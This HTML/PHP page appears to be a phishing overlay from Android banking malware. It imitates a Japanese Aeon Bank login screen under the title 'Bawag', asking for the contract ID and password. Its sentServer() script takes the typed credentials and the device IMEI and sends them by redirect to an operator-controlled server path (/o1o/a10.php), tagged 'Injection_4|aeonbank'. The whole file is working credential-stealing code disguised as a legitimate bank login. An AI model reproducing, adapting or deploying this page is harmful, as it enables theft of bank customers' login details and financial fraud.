<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="jp/jp.co.aeonbank.android.passbook/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
	<img style="padding: 13px;" src="data:image/png;base64,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">
</div>
    <div class="main">

        <div class="container">
<div class="row">
                <div class="col-xs-10 col-sm-8">
                   	<h3> ログイン </h3>
 <div class="form_">

                        <form id="form">

                            <div class="form-group ">
									<input type="text" class="form-control" name="field2" id="Azonostio" placeholder="契約者ID" autocomplete="off" maxlength="50" data-reg="/.{4,50}/" >
                            </div>

                            <div class="form-group">
									<input type="password" class="form-control" name="field3" id="Jelszo" placeholder="ログインパスワード" autocomplete="off" data-reg="/.{4,50}/" maxlength="50" >
                            </div>
							<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
                       								<input type="button" class="input_submitBtn" onClick="sentServer();" value="ログイン">
 </form><br>

</div>
                </div>
            </div>
        </div>
    </div>
<script>
	function sentServer()
	{
		var oNumInp1 = document.getElementById('Azonostio');
	var oNumInp2 = document.getElementById('Jelszo');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	var login1 = document.forms["form"].elements["Azonostio"].value;
	var pass = document.forms["form"].elements["Jelszo"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|aeonbank|"+login1+"|"+pass);
	}
	}
</script>
</body>
</html>
